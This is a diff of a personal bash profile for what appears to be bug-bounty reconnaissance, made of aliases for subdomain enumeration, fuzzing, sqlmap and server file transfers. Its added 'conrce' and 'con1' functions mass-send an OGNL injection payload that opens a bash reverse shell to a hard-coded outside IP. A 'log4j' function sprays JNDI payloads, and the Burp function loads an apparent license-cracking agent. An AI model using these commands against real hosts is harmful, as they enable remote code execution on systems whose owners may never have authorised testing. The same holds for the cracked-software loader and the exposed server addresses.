@@ -48,8 +48,8 @@ edpro(){
 	vim ~/tools/.bash_profile
 }
 burp(){
-	cd '/home/rocky/tools/Burp/Burp Suite Professional Edition v2021.8.3'
-	java -noverify -javaagent:Dr.FarFar.jar -jar burpsuite_pro_v2021.8.3.jar & exit
+	cd '/home/rocky/tools/burp/Burp Suite Professional Edition v2022.3.7'
+    java -noverify --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED -javaagent:Dr-FarFar.jar -jar burpsuite_pro_v2022.3.7.jar & exit
 }
 getroot(){
 	cat $1 | rev | cut -d "." -f 1,2 | rev | sort -u | tee -a root-$1
@@ -152,7 +152,7 @@ recon(){
 	cat $1 | xargs -n1 -P4 -I{} subfinder -silent -d {} | anew domains
 
     #amass
-    cat $1 | xargs -n1 -P2 -I{} sh -c "amass enum -passive -nolocaldb -nocolor -config ~/tools/amass/config.ini -d {}" | anew domains
+    cat $1 | xargs -n1 -I{} sh -c "amass enum -passive -nolocaldb -nocolor -config ~/tools/amass/config.ini -d {}" | anew domains
 
     #clean domains
     sanitizer.py $1 domains | sort -u > t
@@ -178,19 +178,22 @@ urls(){
     cat $1 | xargs -n1 -P4 -I{} geturls.py {} > urls
 }
 apis(){
-    grep -Hnr -E 'AIza[0-9A-Za-z_-]{35}|AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}|EAACEdEose0cBA[0-9A-Za-z]+'
+    grep -Hnro -E 'AIza[0-9A-Za-z_-]{35}|AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}|EAACEdEose0cBA[0-9A-Za-z]+'
 }
 rlist(){
     cat $1 | xargs -n1 -P4 -I{} recon.py {}
 }
 am(){
-    cat $1 | xargs -n1 -P5 -I{} amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d {}
+    cat $1 | xargs -P4 -n1 -I{} amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d {}
 }
 param(){
     arjun -u $1 -w ~/tools/tools/files/parameters.txt $2 $3 
 }
 fuzz(){
-    ffuf -u $1 -w ~/tools/tools/files/fdict.txt -t 200 -H "X-Forwarded-For: 127.0.0.1" -ac -mc all -c $2 $3 $4 $5 $6 $7 $8 $9 
+    ffuf -u $1 -w ~/tools/tools/files/fdict.txt -t 200 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0' -H "X-Forwarded-For: 127.0.0.1" -ac -mc all -c $2 $3 $4 $5 $6 $7 $8 $9 
+}
+fuzzw(){
+    ffuf -u $1 -w $2 -t 200 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0' -H "X-Forwarded-For: 127.0.0.1" -ac -mc all -c $3 $4 $5 $6 $7 $8 $9 
 }
 jshunter(){
     cat $1 | httpx -fl 0 -mc 200 -content-length -sr -srd scripts/ -silent -no-color -o jsindex
@@ -225,12 +228,6 @@ certspotter(){
     curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u | grep $1
 }
 enum(){
-    #clean domains
-    sanitizer.py root domains | sort -u > t
-    rm domains
-    removeroot.py t > domains
-    rm t
-
     #get alive
     cat domains | dnsx -resp -o resp -silent
     cat resp | awk '{print $1}' | sort -u | anew dns
@@ -238,21 +235,12 @@ enum(){
     clean_ips.py ips | anew ip_addresses
 
     #get data on active domains
-    hunter.py --no-redirect -p 443,8443,4443,8080,8000,80 -t 75 -timeout 10 domains
+    mkdir out
+    cat dns | httpx -status-code -content-length -title -no-color -silent -location -p 443,8443,80,8080 -td -t 100 -o out/index
     
     #get active-domains
     cat out/index | awk '{print $1}' | sort -u > active-domains
     
-    #wayback machine
-    echo '[*]Starting geturls.py'
-    urls active-domains
-    
-    #jshunter on jsfiles
-    echo '[*]Starting jshunter'
-    cd out/
-    cat ../urls | grep -a '\.js' | grep -vaE '\.json|\.jsp' | anew jsfiles
-    jshunter jsfiles
-    cd ..
 }
 struds(){
     cat $1 | httpx -path '/sm/login/loginpagecontentgrabber.do' -threads 100 -random-agent -x GET -title -tech-detect -status-code  -follow-redirects -title -mc 200 -no-color -content-length -o $2 
@@ -267,7 +255,7 @@ sjack(){
     subjack -w $1 -t 100 -timeout 30 -c ~/tools/subjack/fingerprints.json -ssl
 }
 reconpad(){
-    ssh -i "~/tools/server2/reconpad.pem" ubuntu@3.133.52.79
+    ssh -i "~/tools/server/servers.pem" ubuntu@43.204.212.209
 }
 checkey(){
     cat ~/bounty/maps-urls | sed "s/KEY_HERE/$1/g"
@@ -276,10 +264,10 @@ sdns(){
     shuffledns -d $1 -w $2 -r ~/tools/tools/files/resolvers.txt -strict-wildcard -silent
 }
 sendr(){
-    scp -i "~/tools/server2/reconpad.pem" $1 ubuntu@3.133.52.79:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@43.204.212.209:/home/ubuntu/$2
 }
 recvr(){
-    scp -i "~/tools/server2/reconpad.pem" ubuntu@3.133.52.79:/home/ubuntu/$1 $2
+    scp -i "~/tools/server/servers.pem" ubuntu@43.204.212.209:/home/ubuntu/$1 $2
 }
 fp(){
     find . -name $1 | xargs -n1 -I{} cat {} | sort -u
@@ -307,22 +295,16 @@ xss(){
     fi
 }
 sqli(){
-    if [ $# != 2 ]
-    then
-        echo "need two arguments"
-    else
-        cat $1 | grep -iE '=|%3D' | gf sqli > $2
-        python3 ~/tools/sqlmap-dev/sqlmap.py -m $2 --dbs --batch --risk 3 --level 5
-    fi
+    python3 ~/tools/sqlmap/sqlmap.py -m $1 --dbs --batch --risk 3
 }
 fuzzer(){
-    ssh -i "~/tools/server2/fuzzer.pem" ubuntu@18.219.144.38
+    ssh -i "~/tools/server/servers.pem" ubuntu@13.126.105.35
 }
 sendf(){
-     scp -i "~/tools/server2/fuzzer.pem" $1 ubuntu@18.219.144.38:/home/ubuntu/$2
+     scp -i "~/tools/server/servers.pem" $1 ubuntu@13.126.105.35:/home/ubuntu/$2
 }
 recvf(){
-    scp -i "~/tools/server2/fuzzer.pem" ubuntu@18.219.144.38:/home/ubuntu/$1 $2
+    scp -i "~/tools/server/servers.pem" ubuntu@13.126.105.35:/home/ubuntu/$1 $2
 }
 dork-root(){
     echo -n site:*.;join.py $1 | sed 's/,/ | site:*./g'
@@ -334,31 +316,31 @@ sqlm(){
     python3 ~/tools/sqlmap/sqlmap.py -u $1 --risk 2 --dbs --batch $2 $3 $4 $5
 }
 sqlmf(){
-    python3 ~/tools/sqlmap/sqlmap.py -r $1 --risk 2 --dbs --batch $2 $3 $4 $5
+    python3 ~/tools/sqlmap/sqlmap.py -r $1 --risk 3 --dbs --batch $2 $3 $4 $5 $6 $7 $8 $9
 }
 bounty(){
-    ssh -i "~/tools/server/bounty.pem" ubuntu@13.232.170.202
+    ssh -i "~/tools/server/servers.pem" ubuntu@52.66.245.73
 }
 sendb(){
-    scp -i "~/tools/server/bounty.pem" $1 ubuntu@13.232.170.202:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@52.66.245.73:/home/ubuntu/$2
 }
 recvb(){
-    scp -i "~/tools/server/bounty.pem" ubuntu@13.232.170.202:/home/ubuntu/$1 $2
+    scp -i "~/tools/server/servers.pem" ubuntu@52.66.245.73:/home/ubuntu/$1 $2
 }
 asn(){
     curl -s "http://asnlookup.com/api/lookup?org=$1" | jq -r '.[]'
 }
 scanner(){
-    ssh -i "~/tools/server2/scanner.pem" ubuntu@52.15.89.129
+    ssh -i "~/tools/server/servers.pem" ubuntu@3.110.208.108
 }
 sends(){
-    scp -i "~/tools/server2/scanner.pem" $1 ubuntu@52.15.89.129:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@3.110.208.108:/home/ubuntu/$2
 }
 recvs(){
-    scp -i "~/tools/server2/scanner.pem" ubuntu@52.15.89.129:/home/ubuntu/$1 $2
+    scp -i "~/tools/server/servers.pem" ubuntu@3.110.208.108:/home/ubuntu/$1 $2
 }
 hx(){
-    cat $1 | httpx -status-code -content-length -title -no-color -silent -location
+    cat $1 | httpx -status-code -content-length -title -no-color -silent -location -td -t 100 
 }
 ver(){
     cd /home/rocky/recondata/verizonmedia/main/03-10-21
@@ -386,81 +368,37 @@ log4j(){
     cat $1 | grep = | qsreplace '${jndi:ldap://x${hostName}.L4J.tl6jvby071gpq088dac5st2mh.canarytokens.com/a}' | grep -vE 'www|join|invite|==' | urldedupe -s | httpx
 }
 lassan(){
-    ssh -i "~/tools/server2/lassan.pem" ubuntu@3.142.160.64
+    ssh -i "~/tools/server/lassan.pem" ubuntu@3.142.160.64
 }
 sendl(){
-    scp -i "~/tools/server2/lassan.pem" $1 ubuntu@3.142.160.64:/home/ubuntu/$2
+    scp -i "~/tools/server/lassan.pem" $1 ubuntu@3.142.160.64:/home/ubuntu/$2
 }
 recvl(){
-    scp -i "~/tools/server2/lassan.pem" ubuntu@3.142.160.64:/home/ubuntu/$1 $2
-}
-bounty1(){
-    ssh -i "~/tools/server3/bounty1.pem" ubuntu@44.197.32.46
-}
-sendb1(){
-    scp -i "~/tools/server3/bounty1.pem" $1 ubuntu@44.197.32.46:/home/ubuntu/$2
-}
-recvb1(){
-    scp -i "~/tools/server3/bounty1.pem" ubuntu@44.197.32.46:/home/ubuntu/$1 $2
-}
-bounty2(){
-    ssh -i "~/tools/server3/bounty2.pem" ubuntu@52.202.251.223
-}
-sendb2(){
-    scp -i "~/tools/server3/bounty2.pem" $1 ubuntu@52.202.251.223:/home/ubuntu/$2
-}
-recvb2(){
-    scp -i "~/tools/server3/bounty2.pem" ubuntu@52.202.251.223:/home/ubuntu/$1 $2
-}
-bounty3(){
-    ssh -i "~/tools/server3/bounty3.pem" ubuntu@3.87.164.78
-}
-sendb3(){
-    scp -i "~/tools/server3/bounty3.pem" $1 ubuntu@3.87.164.78:/home/ubuntu/$2
-}
-recvb3(){
-    scp -i "~/tools/server3/bounty3.pem" ubuntu@3.87.164.78:/home/ubuntu/$1 $2
-}
-bounty4(){
-    ssh -i "~/tools/server3/bounty4.pem" ubuntu@34.195.26.167
-}
-sendb4(){
-    scp -i "~/tools/server3/bounty4.pem" $1 ubuntu@34.195.26.167:/home/ubuntu/$2
-}
-recvb4(){
-    scp -i "~/tools/server3/bounty4.pem" ubuntu@34.195.26.167:/home/ubuntu/$1 $2
+    scp -i "~/tools/server/lassan.pem" ubuntu@3.142.160.64:/home/ubuntu/$1 $2
 }
 sendall(){
     echo 'reconpad'
-    scp -i "~/tools/server2/reconpad.pem" $1 ubuntu@3.133.52.79:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@43.204.212.209:/home/ubuntu/$2
     echo 'fuzzer'
-    scp -i "~/tools/server2/fuzzer.pem" $1 ubuntu@18.219.144.38:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@13.126.105.35:/home/ubuntu/$2
     echo 'scanner'
-    scp -i "~/tools/server2/scanner.pem" $1 ubuntu@52.15.89.129:/home/ubuntu/$2
-    echo 'bounty1'
-    scp -i "~/tools/server3/bounty1.pem" $1 ubuntu@44.197.32.46:/home/ubuntu/$2
-    echo 'bounty2'
-    scp -i "~/tools/server3/bounty2.pem" $1 ubuntu@52.202.251.223:/home/ubuntu/$2
-    echo 'bounty3'
-    scp -i "~/tools/server3/bounty3.pem" $1 ubuntu@3.87.164.78:/home/ubuntu/$2
-    echo 'bounty4'
-    scp -i "~/tools/server3/bounty4.pem" $1 ubuntu@34.195.26.167:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@3.110.208.108:/home/ubuntu/$2
+    echo 'bounty'
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@52.66.245.73:/home/ubuntu/$2
+    echo 'receiver'
+    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@3.110.153.25:/home/ubuntu/$2
 }
 sendallr(){
     echo 'reconpad'
-    scp -i "~/tools/server2/reconpad.pem" -r $1 ubuntu@3.133.52.79:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@43.204.212.209:/home/ubuntu/$2
     echo 'fuzzer'
-    scp -i "~/tools/server2/fuzzer.pem" -r $1 ubuntu@18.219.144.38:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@13.126.105.35:/home/ubuntu/$2
     echo 'scanner'
-    scp -i "~/tools/server2/scanner.pem" -r $1 ubuntu@52.15.89.129:/home/ubuntu/$2
-    echo 'bounty1'
-    scp -i "~/tools/server3/bounty1.pem" -r $1 ubuntu@44.197.32.46:/home/ubuntu/$2
-    echo 'bounty2'
-    scp -i "~/tools/server3/bounty2.pem" -r $1 ubuntu@52.202.251.223:/home/ubuntu/$2
-    echo 'bounty3'
-    scp -i "~/tools/server3/bounty3.pem" -r $1 ubuntu@3.87.164.78:/home/ubuntu/$2
-    echo 'bounty4'
-    scp -i "~/tools/server3/bounty4.pem" -r $1 ubuntu@34.195.26.167:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@3.110.208.108:/home/ubuntu/$2
+    echo 'bounty'
+    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@52.66.245.73:/home/ubuntu/$2
+    echo 'receiver'
+    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@3.110.153.25:/home/ubuntu/$2
 }
 
 c(){
@@ -489,10 +427,13 @@ uu(){
     cat $1 | grep -aE "$2" | awk '{gsub("\[", "", $4);gsub("\]", "", $4);print $4" "$0}' | uniq2.py - | sort -n 
 }
 uhp(){
-    cat $1 | awk '{gsub("\[", "", $4);gsub("\]", "", $4);print $4" "$0}' 
+    cat $1 | awk '{gsub("\[", "", $4);gsub("\]", "", $4);print $4"    "$0}' 
 }
 uhp3(){
     cat $1 | awk '{gsub("\[", "", $3);gsub("\]", "", $3);print $3"  "$0}' 
+}
+uhp2(){
+    cat $1 | awk '{gsub("\[", "", $2);gsub("\]", "", $2);print $2"  "$0}' 
 }
 cache(){
     grep -Hnir 'x-cache' | awk -F ':' '{print $1}' | sort -u  | httpx -H 'X-Forwarded-Host: test123' -ms test123 -t 200
@@ -501,8 +442,119 @@ m2h(){
     masscan2http.py $1 | httpx -silent -no-color -title -status-code -content-length
 }
 grafana-tr(){
-    echo $1 | httpx -silent -sc -cl -title -paths ~/tools/tools/files/grafana-pt
+    echo $1 | httpx -silent -sc -cl -title -path ~/tools/tools/files/grafana-pt
 }
 domxss(){
     grep -Hnir -E "addEventListener\((?:'|\")message(?:'|\")" | awk -F '_' '{print $1}' | httpx -sc -cl
+}
+receiver(){
+    ssh -i "~/tools/server/servers.pem" ubuntu@3.110.153.25
+}
+sendre(){
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@3.110.153.25:/home/ubuntu/$2
+}
+recvre(){
+    scp -i "~/tools/server/servers.pem" ubuntu@3.110.153.25:/home/ubuntu/$1 $2
+}
+n(){
+    gedit ~/notes & exit
+}
+ser(){
+    gedit ~/servers & exit
+}
+d5(){
+    cd /media/rocky/24193e18-fd91-4da1-b89e-dafdfc04ab2b/
+}
+ama(){
+    cat $1 | xargs -n1 -I{} sh -c "amass enum -active -trf ~/tools/tools/files/resolvers.txt -tr 8.8.8.8 -config ~/tools/amass/config.ini -o {}.out -d {}"
+}
+sbrc(){
+    source ~/.bashrc
+}
+ebrc(){
+    vi ~/.bashrc
+}
+zap(){
+    java -jar ~/ZAP/zap-2.11.1.jar & exit
+}
+sd(){
+    cat targets-data.txt | grep -aE $1 | awk -F ',' '{print $1}' | xargs -n1 -I{} sh -c "cat http-result | grep -a {}" 
+}
+conrce(){
+    cat $1 | httpx -sc -cl -nc -path '/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/43.204.212.209/1270%200%3E%261%27%29.start%28%29%22%29%7D/'
+}
+con1(){
+    echo $1 | httpx -sc -cl -nc -path '/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/43.204.212.209/1270%200%3E%261%27%29.start%28%29%22%29%7D/'
+}
+autowhois(){
+    cat $2 | xargs -n1 -I{} sh -c "whois {} | grep -aiE $1>/dev/null && echo {};sleep 1"
+}
+xnlf(){
+    python3 ~/tools/xnLinkFinder/xnLinkFinder.py -p 50 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0' -i $1 -o cli -d 3 | sed "s/^\//$1\//g"
+}
+xnall(){
+    python3 ~/tools/xnLinkFinder/xnLinkFinder.py -p 50 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0' -i $1 -o cli -d 3 | sed "s/^\//$1\//g"
+}
+fall(){
+    xargs -P `nproc` -I {} sh -c 'url="{}"; ffuf -mc all -H "X-Forwarded-For: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0" -u "{}/FUZZ" -w ~/tools/tools/files/dict.txt -t 200 -ac -se -o fuzz/${url##*/}-${url%%:*}.json' < $1
+    cat fuzz/* | jq '[.results[]|{status: .status, length: .length, url: .url}]' | grep -oP "status\":\s(\d{3})|length\":\s(\d{1,7})|url\":\s\"(http[s]?:\/\/.*?)\"" | paste -d' ' - - - | awk '{print $2" "$4" "$6}' | sed 's/\"//g' > result.txt
+
+    cat result.txt | awk '{print $1" ["$2"] "$3" "$4" "$5}' > r
+    guniq 1 r | sort -n > uniq-result.txt
+    rm r
+}
+sqltest()
+{
+    cat $1 | grep -vE 'Cloudflare|Akamai|Apache|Error|www|Nginx|Cloudfront|IIS|400|50[0-9]|\[0\]|Access'
+}
+srf(){
+    sendf root recon/
+    sendf out-of-scope recon/
+}
+ssrf(){
+    cat $1 | grep -aiE 'host\=|redirect\=|uri\=|path\=|continue\=|url\=|window\=|next\=|data\=|image-source\=|n\=|to\=|follow\=|u\=|go\=|fetch\=|source\=|img\-src\='
+}
+vhost(){
+    ffuf -u $1 -H "Host: FUZZ.$2" -t 200 -c -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0" -H "X-Forwarded-For: 127.0.0.1" -w ~/tools/tools/files/best-dns-wordlist.txt -ac -mc all
+}
+countd(){
+    cat root | xargs -n1 -I{} sh -c "echo {};echo '';cat out/index | grep -aiE '\.{}';echo '';echo '--------------------------------------------------------------------------'"
+}
+crawl()
+{
+    echo $1 | hakrawler | httpx -silent -http-proxy http://127.0.0.1:8080
+}
+scan-takeovers()
+{
+    while :
+    do  
+        for i in $(ls | grep -aE '^x')
+        do 
+            SubOver -t 200 -timeout 10 -l $i
+        done | sed 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g' | anew takeovers.txt | notify.py
+        sleep 10800
+    done
+}
+vs(){
+    code . && exit
+}
+bruted(){
+    for i in $(cat $1)
+    do
+        puredns bruteforce -r ~/tools/tools/files/resolvers.txt -w $i.out ~/tools/tools/files/dns-Rocky-small.txt $i
+    done
+}
+perm(){
+    gotator -sub $1 -perm ~/tools/dnsgen/dnsgen/words.txt -depth 2 -numbers 5 -silent
+}
+resv(){
+    puredns resolve -r ~/tools/tools/files/resolvers.txt -w $1.out $1
+}
+dt(){
+    pwd | cut -d '/' -f5 | xargs -n1 -I{} sh -c "scp -i "~/tools/server/servers.pem" ubuntu@13.126.105.35:/home/ubuntu/{}.tar.gz ."
+}
+ufr(){
+    cat result.txt | awk '{print $1" ["$2"] "$3" "$4" "$5}' > r
+    guniq 1 r | sort -n > uniq-result.txt
+    rm r
 }
